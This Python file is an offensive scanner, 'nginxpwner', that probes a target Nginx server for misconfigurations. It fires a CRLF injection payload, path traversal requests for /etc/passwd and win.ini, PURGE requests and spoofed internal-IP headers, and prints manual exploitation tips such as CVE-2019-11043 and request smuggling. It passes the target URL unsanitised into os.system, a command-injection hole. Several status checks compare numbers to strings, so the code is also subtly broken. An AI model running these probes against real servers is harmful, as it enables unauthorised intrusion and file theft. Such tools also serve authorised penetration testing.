import requests
import sys
from bs4 import BeautifulSoup
import re
from packaging import version
import os
import requests_raw
from colorama import Fore

banner='''
 _   _  _____  _____  _   _ __   ________  _    _  _   _  _____ ______
| \ | ||  __ \|_   _|| \ | |\ \ / /| ___ \| |  | || \ | ||  ___|| ___ \\
|  \| || |  \/  | |  |  \| | \ V / | |_/ /| |  | ||  \| || |__  | |_/ /
| . ` || | __   | |  | . ` | /   \ |  __/ | |/\| || . ` ||  __| |    /
| |\  || |_\ \ _| |_ | |\  |/ /^\ \| |    \  /\  /| |\  || |___ | |\ \\
\_| \_/ \____/ \___/ \_| \_/\/   \/\_|     \/  \/ \_| \_/\____/ \_| \_|

            A common vulnerability scanner for Nginx
                      Author @stark0de1'''

print(Fore.BLUE+banner)

if len(sys.argv) != 3:
    print(Fore.WHITE+"Usage: python3 nginxpwner.py https://example.com filewithexistingfolderpaths")
    sys.exit()
if sys.argv[1].endswith("/"):
    print(Fore.WHITE+"[?] Please provide the URL without the last slash")
    sys.exit()

url = sys.argv[1]
existingfolderpathlist = sys.argv[2]

print(Fore.YELLOW+"[!] IF your enumeration returned any 401 or 403 page, please try doing a request to whatever route and add the header X-Accel-Redirect: /pathwith401or403")
basereq = requests.get(url)
print(Fore.WHITE)
os.system("gobuster dir --url "+url+" -w ./nginx.txt --wildcard")
uri_crlf_test= requests.get(url+"/%0d%0aDetectify:%20clrf")
if "Detectify" in uri_crlf_test.headers:
    print(Fore.RED+"[-] CRLF injection found via $uri or $document_uri parameter with payload: %0d%0aDetectify:%20crlf as URI")
else:
    print(Fore.GREEN+"[+] No CRLF via common misconfiguration found")
#p = subprocess.Popen('curl -IL -X PURGE -D - "'+url+'"/* | grep HTTP', shell=True, stdout=subprocess.PIPE)
#output, _ = p.communicate()
purgemethod=requests.request("PURGE", url+"/", allow_redirects=True)
#print(purgemethod.text+str(purgemethod.headers)+str(purgemethod.status_code))
if purgemethod.status_code == "204":
    print(Fore.RED+"[-] Possibly misconfigured PURGE HTTP method (purges the web cache), test this HTTP method manually")
else:
    print(Fore.GREEN+"[+] No signs of misconfigured PURGE HTTP method")

headers={"Referer": "bar"}
variable_leakage = requests.get(url+"/foo$http_referer", headers=headers)
if "foobar" in variable_leakage.text:
    print(Fore.RED+"[-] Variable leakage found in NGINX via Referer header")
    print(Fore.RED+"[-] Test other variables like $realpath_root, $nginx_version")
else:
    print(Fore.GREEN+"[+] No variable leakage misconfiguration found")
#merge-slashes set to off
merge_slashes_req = requests.get(url+"///")
merge_slashes_etc_passwd_old = requests.get(url+ "///../../../../../etc/passwd")
merge_slashes_etc_passwd = requests.get(url+ "//////../../../../../../etc/passwd")
merge_slashes_winini_old = requests.get(url+ "///../../../../../win.ini")
merge_slashes_winini = requests.get(url+ "//////../../../../../../win.ini")

if basereq.status_code == merge_slashes_req and basereq.text == merge_slashes_req.text:
    print(Fore.RED+"[-] Merge slashes set to off. This is useful in case we find an LFI")
if merge_slashes_etc_passwd.status_code == "200" or merge_slashes_etc_passwd_old.status_code =="200":
    print(Fore.RED+"[-] Possible path traversal vulnerability found for insecure merge_slashes setting")
    print(Fore.RED+"[-] Try this to URIs manually: ///../../../../../etc/passwd and //////../../../../../../etc/passwd")
elif merge_slashes_winini.status_code == "200" or merge_slashes_winini_old.status_code =="200":
    print(Fore.RED+"[-] Possible path traversal vulnerability found for insecure merge_slashes setting")
    print(Fore.RED+"[-] Try this to URIs manually: ///../../../../../win.ini and //////../../../../../../win.ini")
else:
    print(Fore.GREEN+"[+] No merge_slashes misconfigurations found")
print(Fore.BLUE+"[?] Testing hop-by-hop headers"+Fore.WHITE)
onetwosevendict={}
localhostdict={}
oneninetwodict={}
tenzerozerodict={}

complete_header_list = [
    "Proxy-Host","Request-Uri","X-Forwarded","X-Forwarded-By","X-Forwarded-For",
    "X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Server","X-Forwarder-For",
    "X-Forward-For","Base-Url","Http-Url","Proxy-Url","Redirect","Real-Ip","Referer",
    "Referrer","Uri","Url","X-Host","X-Http-Destinationurl","X-Http-Host-Override",
    "X-Original-Remote-Addr","X-Original-Url","X-Proxy-Url","X-Rewrite-Url","X-Real-Ip","X-Remote-Addr", "X-Proxy-URL", "X-Original-Host", "X-Originally-Forwarded-For", "X-Forwarded-For-Original",
    "X-Originating-Ip","X-Ip", "X-Client-Ip", "X-Real-Ip"
    ]
for i in complete_header_list:
    onetwosevendict.update({i: "127.0.0.1"})
for i in complete_header_list:
    localhostdict.update({i: "localhost"})
for i in complete_header_list:
    oneninetwodict.update({i: "192.168.1.1"})
for i in complete_header_list:
    tenzerozerodict.update({i: "10.0.0.1"})
counter=0

r_first= requests.get(url+"/") #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
for x, y in onetwosevendict.items():
    z = {x:y}
    r = requests.get(url+"/", headers=z)
    resta = len(r.text) - len(r_first.text)
    if r.status_code != r_first.status_code or resta > 20:
       print("Difference found with headers:")
       print(r.request.headers)
       counter+=1
if counter == 0:
   print("No relevant results for 127.0.0.1 tests")

counter=0

r_first= requests.get(url+"/") #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
for x, y in localhostdict.items():
    z = {x:y}
    r = requests.get(url+"/", headers=z)
    resta = len(r.text) - len(r_first.text)
    if r.status_code != r_first.status_code or resta > 20:
       print("Difference found with headers:")
       print(r.request.headers)
       counter+=1
if counter == 0:
   print("No relevant results for localhost tests")

counter=0

r_first= requests.get(url+"/") #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
for x, y in oneninetwodict.items():
    z = {x:y}
    r = requests.get(url+"/", headers=z)
    resta = len(r.text) - len(r_first.text)
    if r.status_code != r_first.status_code or resta > 20:
       print("Difference found with headers:")
       print(r.request.headers)
       counter+=1
if counter == 0:
   print("No relevant results for 192.168.1.1 tests")

counter=0

r_first= requests.get(url+"/") #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
for x, y in tenzerozerodict.items():
    z = {x:y}
    r = requests.get(url+"/", headers=z)
    resta = len(r.text) - len(r_first.text)
    if r.status_code != r_first.status_code or resta > 20:
       print("Difference found with headers:")
       print(r.request.headers)
       counter+=1
if counter == 0:
   print("No relevant results for 10.0.0.1 tests")
  
print(Fore.BLUE+"[?] To test Raw backend reading responses, please make a request with the following contents to Nginx. In case the response is interesting: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#raw-backend-response-reading")
a='''
GET /? XTTP/1.1
Host: 127.0.0.1
Connection: close
'''
print(Fore.WHITE+a)
print(Fore.YELLOW+"[!] If the site uses PHP check for this misconfig: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#script_name and also check this: https://github.com/jas502n/CVE-2019-11043. A last advice, if you happen to have a restricted file upload and you can reach the file you uploaded try making a request to <filename>/whatever.php,and if it executes PHP code it is because the PHP-FastCGI directive is badly configured (this normally only works for older PHP versions)")

print(Fore.BLUE+"[?] Executing Kyubi to check for path traversal vulnerabilities via misconfigured NGINX alias directive"+Fore.WHITE)
pathlist = open(existingfolderpathlist, "r")
pathlines = pathlist.readlines()
for pathline in pathlines:
    os.system("kyubi "+url+"/"+pathline.strip())
print(Fore.CYAN+ "[*] More things that you need to test by hand: CORS misconfiguration (ex: bad regex) with tools like Corsy, Host Header injection, Web cache poisoning & Deception in case NGINX is being for caching as well, HTTP request smuggling both normal request smuggling and https://bertjwregeer.keybase.pub/2019-12-10%20-%20error_page%20request%20smuggling.pdf. As well as the rest of typical web vulnerabilities")
